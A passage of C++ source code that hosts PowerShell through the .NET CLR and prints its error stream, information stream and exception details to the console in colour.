    mscorlib::_Type* pPSInvocationStateInfoType = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, GetTypeName_PowerShell(), &pPowerShellType))
        goto exit;

    if (!shGetStream(pAppDomain, vtPowerShellInstance, L"Error", &vtErrorStream))
        goto exit;

    if (vtErrorStream.vt != VT_EMPTY)
    {
        PrintPowerShellErrorStream(pAppDomain, vtErrorStream);
    }

    if (!clr::clrGetPropValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"InvocationStateInfo", &vtInvocationStateInfo))
        goto exit;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSInvocationStateInfo", &pPSInvocationStateInfoType))
        goto exit;

    if (!clr::clrGetPropValue(pPSInvocationStateInfoType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtInvocationStateInfo, L"Reason", &vtReason))
        goto exit;

    if (vtReason.vt != VT_EMPTY)
    {
        PrintPowerShellInvocationStateInfoReason(pAppDomain, vtReason);
    }

exit:
    if (pPSInvocationStateInfoType) pPSInvocationStateInfoType->Release();
    if (pPSDataStreamsType) pPSDataStreamsType->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtReason);
    VariantClear(&vtInvocationStateInfo);
    VariantClear(&vtErrorStream);

    return;
}

void PrintInformationRecord(mscorlib::_AppDomain* pAppDomain, VARIANT vtInformationRecord)
{
    VARIANT vtInformationRecordAsString = { 0 };
    mscorlib::_Type* pInformationRecordType = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.InformationRecord", &pInformationRecordType))
        goto exit;

    if (!clr::clrGetMethod(pInformationRecordType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethodInfo))
        goto exit;

    if (!clr::clrInvokeMethod(pToStringMethodInfo, vtInformationRecord, NULL, &vtInformationRecordAsString))
        goto exit;

    wprintf(L"%ws\n", vtInformationRecordAsString.bstrVal);

exit:
    if (pToStringMethodInfo) pToStringMethodInfo->Release();
    if (pInformationRecordType) pInformationRecordType->Release();

    VariantClear(&vtInformationRecordAsString);

    return;
}

void PrintErrorRecord(mscorlib::_AppDomain* pAppDomain, VARIANT vtErrorRecord)
{
    WORD wOldColor = 0;
    size_t sScriptStackTraceLen;
    VARIANT vtErrorRecordType = { 0 };
    VARIANT vtTargetObjectProperty = { 0 };
    VARIANT vtTargetObject = { 0 };
    VARIANT vtScriptStackTraceProperty = { 0 };
    VARIANT vtScriptStackTrace = { 0 };
    VARIANT vtCategoryInfoProperty = { 0 };
    VARIANT vtCategoryInfo = { 0 };
    VARIANT vtCategoryInfoMessage = { 0 };
    VARIANT vtFullyQualifiedErrorIdProperty = { 0 };
    VARIANT vtFullyQualifiedErrorId = { 0 };
    VARIANT vtExceptionProperty = { 0 };
    VARIANT vtException = { 0 };
    VARIANT vtExceptionType = { 0 };
    VARIANT vtExceptionMessageProperty = { 0 };
    VARIANT vtExceptionMessage = { 0 };
    mscorlib::_Type* pErrorCategoryInfoType = NULL;
    mscorlib::_MethodInfo* pErrorCategoryInfoGetMessageMethodInfo = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtErrorRecord, &vtErrorRecordType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"TargetObject", &vtTargetObjectProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtTargetObjectProperty, vtErrorRecord, &vtTargetObject))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"ScriptStackTrace", &vtScriptStackTraceProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtScriptStackTraceProperty, vtErrorRecord, &vtScriptStackTrace))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"CategoryInfo", &vtCategoryInfoProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtCategoryInfoProperty, vtErrorRecord, &vtCategoryInfo))
        goto exit;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.ErrorCategoryInfo", &pErrorCategoryInfoType))
        goto exit;

    if (!clr::clrGetMethod(pErrorCategoryInfoType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"GetMessage", 0, &pErrorCategoryInfoGetMessageMethodInfo))
        goto exit;

    if (!clr::clrInvokeMethod(pErrorCategoryInfoGetMessageMethodInfo, vtCategoryInfo, NULL, &vtCategoryInfoMessage))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"FullyQualifiedErrorId", &vtFullyQualifiedErrorIdProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtFullyQualifiedErrorIdProperty, vtErrorRecord, &vtFullyQualifiedErrorId))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"Exception", &vtExceptionProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtExceptionProperty, vtErrorRecord, &vtException))
        goto exit;

    if (!dotnet::System_Object_GetType(pAppDomain, vtException, &vtExceptionType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtExceptionType, L"Message", &vtExceptionMessageProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtExceptionMessageProperty, vtException, &vtExceptionMessage))
        goto exit;

    SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY, &wOldColor);

    if (vtTargetObject.vt == VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
    {
        wprintf(L"%ws : %ws\n", vtTargetObject.bstrVal, vtExceptionMessage.bstrVal);
    }
    else if (vtTargetObject.vt != VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
    {
        wprintf(L". : %ws\n", vtExceptionMessage.bstrVal);
    }

    if (vtScriptStackTrace.vt == VT_BSTR)
    {
        wprintf(L"%ws\n", vtScriptStackTrace.bstrVal);
    }

    if (vtTargetObject.vt != VT_EMPTY)
    {
        sScriptStackTraceLen = wcslen(vtTargetObject.bstrVal);
        wprintf(L"+ %ws\n", vtTargetObject.bstrVal);
        wprintf(L"+ ");
        for (int i = 0; i < sScriptStackTraceLen; i++) { wprintf(L"%ws", L"~"); }
        wprintf(L"\n");
    }

    if (vtCategoryInfoMessage.vt == VT_BSTR)
    {
        wprintf(L"    + CategoryInfo           : %ws\n", vtCategoryInfoMessage.bstrVal);
    }

    if (vtFullyQualifiedErrorId.vt == VT_BSTR)
    {
        wprintf(L"    + FullyQualifiedErrorId  : %ws\n", vtFullyQualifiedErrorId.bstrVal);
    }

    if (wOldColor != 0)
    {
        SetConsoleTextColor(wOldColor, NULL);
    }

    wprintf(L"\n");

exit:
    if (pErrorCategoryInfoGetMessageMethodInfo) pErrorCategoryInfoGetMessageMethodInfo->Release();
    if (pErrorCategoryInfoType) pErrorCategoryInfoType->Release();

    VariantClear(&vtExceptionMessage);
    VariantClear(&vtExceptionMessageProperty);
    VariantClear(&vtExceptionType);
    VariantClear(&vtException);
    VariantClear(&vtExceptionProperty);
    VariantClear(&vtFullyQualifiedErrorId);
    VariantClear(&vtFullyQualifiedErrorIdProperty);
    VariantClear(&vtCategoryInfoMessage);
    VariantClear(&vtCategoryInfo);
    VariantClear(&vtCategoryInfoProperty);
    VariantClear(&vtScriptStackTrace);
    VariantClear(&vtScriptStackTraceProperty);
    VariantClear(&vtTargetObject);
    VariantClear(&vtTargetObjectProperty);
    VariantClear(&vtErrorRecordType);

    return;
}

void PrintPowerShellInformationStream(mscorlib::_AppDomain* pAppDomain, VARIANT vtInformationStream)
{
    LONG lArgumentIndex;
    VARIANT vtInformationStreamType = { 0 };
    VARIANT vtInformationStreamCountProperty = { 0 };
    VARIANT vtInformationStreamCount = { 0 };
    VARIANT vtInformationStreamItemProperty = { 0 };
    VARIANT vtIndex = { 0 };
    VARIANT vtInformationRecord = { 0 };
    SAFEARRAY* pIndex = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtInformationStream, &vtInformationStreamType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInformationStreamType, L"Count", &vtInformationStreamCountProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtInformationStreamCountProperty, vtInformationStream, &vtInformationStreamCount))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInformationStreamType, L"Item", &vtInformationStreamItemProperty))
        goto exit;

    if (vtInformationStreamCount.lVal > 0)
    {
        //PRINT_INFO("One or more messages were printed while executing the input script (message count: %d).\n", vtInformationStreamCount.lVal);
        wprintf(L"\n");
        wprintf(L"+-------------------------------+\n");
        wprintf(L"| POWERSHELL INFORMATION STREAM |\n");
        wprintf(L"+-------------------------------+\n");

        for (int i = 0; i < vtInformationStreamCount.lVal; i++)
        {
            InitVariantFromInt32(i, &vtIndex);
            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            lArgumentIndex = 0;
            SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex);

            if (dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtInformationStreamItemProperty, vtInformationStream, pIndex, &vtInformationRecord))
            {
                PrintInformationRecord(pAppDomain, vtInformationRecord);
                VariantClear(&vtInformationRecord);
            }

            SafeArrayDestroy(pIndex);
        }
    }
    
exit:
    VariantClear(&vtInformationStreamItemProperty);
    VariantClear(&vtInformationStreamCountProperty);
    VariantClear(&vtInformationStreamType);

    return;
}

//
// In PowerShell, non-terminating errors are stored in the attribute
// PowerShell.Streams.Error, which is a collection of ErrorRecord objects.
// Each ErrorRecord contains detailed information, such as an exception,
// and a stak trace.
//
void PrintPowerShellErrorStream(mscorlib::_AppDomain* pAppDomain, VARIANT vtErrorStream)
{
    LONG lArgumentIndex;
    VARIANT vtPSDataCollectionType = { 0 };
    VARIANT vtPSDataCollectionCountProperty = { 0 };
    VARIANT vtErrorStreamCount = { 0 };
    VARIANT vtPSDataCollectionItemProperty = { 0 };
    VARIANT vtIndex = { 0 };
    VARIANT vtErrorRecord = { 0 };
    SAFEARRAY* pIndex = NULL;
    mscorlib::_Type* pErrorRecordType = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtErrorStream, &vtPSDataCollectionType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtPSDataCollectionType, L"Count", &vtPSDataCollectionCountProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtPSDataCollectionCountProperty, vtErrorStream, &vtErrorStreamCount))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtPSDataCollectionType, L"Item", &vtPSDataCollectionItemProperty))
        goto exit;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.ErrorRecord", &pErrorRecordType))
        goto exit;

    if (!clr::clrGetMethod(pErrorRecordType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethodInfo))
        goto exit;

    if (vtErrorStreamCount.lVal > 0)
    {
        wprintf(L"\n");
        wprintf(L"+----------------------------------+\n");
        wprintf(L"| POWERSHELL STANDARD ERROR STREAM |\n");
        wprintf(L"+----------------------------------+\n");

        for (int i = 0; i < vtErrorStreamCount.lVal; i++)
        {
            InitVariantFromInt32(i, &vtIndex);
            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            lArgumentIndex = 0;
            SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex);

            if (dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtPSDataCollectionItemProperty, vtErrorStream, pIndex, &vtErrorRecord))
            {
                PrintErrorRecord(pAppDomain, vtErrorRecord);
                VariantClear(&vtErrorRecord);
            }

            SafeArrayDestroy(pIndex);
        }
    }

exit:
    if (pToStringMethodInfo) pToStringMethodInfo->Release();
    if (pErrorRecordType) pErrorRecordType->Release();

    VariantClear(&vtPSDataCollectionType);
    VariantClear(&vtPSDataCollectionCountProperty);
    VariantClear(&vtPSDataCollectionItemProperty);

    return;
}

void PrintPowerShellInvocationStateInfoReason(mscorlib::_AppDomain* pAppDomain, VARIANT vtReason)
{
    WORD wOldColor = 0;
    VARIANT vtExceptionAsString = { 0 };
    mscorlib::_Type* pExceptionType = NULL;
    mscorlib::_MethodInfo* pToStringMethod = NULL;

    if (!clr::clrGetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_RUNTIME, L"System.Exception", &pExceptionType))
        goto exit;

    if (!clr::clrGetMethod(pExceptionType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethod))
        goto exit;

    if (!clr::clrInvokeMethod(pToStringMethod, vtReason, NULL, &vtExceptionAsString))
        goto exit;

    if (vtExceptionAsString.vt == VT_BSTR && wcslen(vtExceptionAsString.bstrVal) > 0)
    {
        //PRINT_ERROR("An exception was thrown while executing the input script.\n\n");
        wprintf(L"\n");
        wprintf(L"+-------------------------+\n");
        wprintf(L"| POWERSHELL EXCEPTION(S) |\n");
        wprintf(L"+-------------------------+\n");

        SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY, &wOldColor);

        wprintf(L"%ws\n\n", vtExceptionAsString.bstrVal);

        if (wOldColor != 0)
        {
            SetConsoleTextColor(wOldColor, NULL);
        }
    }

exit:
    if (pToStringMethod) pToStringMethod->Release();
    if (pExceptionType) pExceptionType->Release();

    VariantClear(&vtExceptionAsString);

    return;
}

void SetConsoleTextColor(WORD wColor, PWORD pwOldColor)
{
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi = { 0 };
    WORD wAttributes;

    if (!GetConsoleScreenBufferInfo(hStdOut, &csbi))
        return;

    if (pwOldColor)
    {
        *pwOldColor = csbi.wAttributes & 0x000f; // Extract and save current foreground color
    }
    
    wAttributes = csbi.wAttributes & 0xfff0; // Extract current attributes except foreground color
    wAttributes |= wColor & 0x000f; // Apply input foreground color

    SetConsoleTextAttribute(hStdOut, wAttributes);

    return;
}
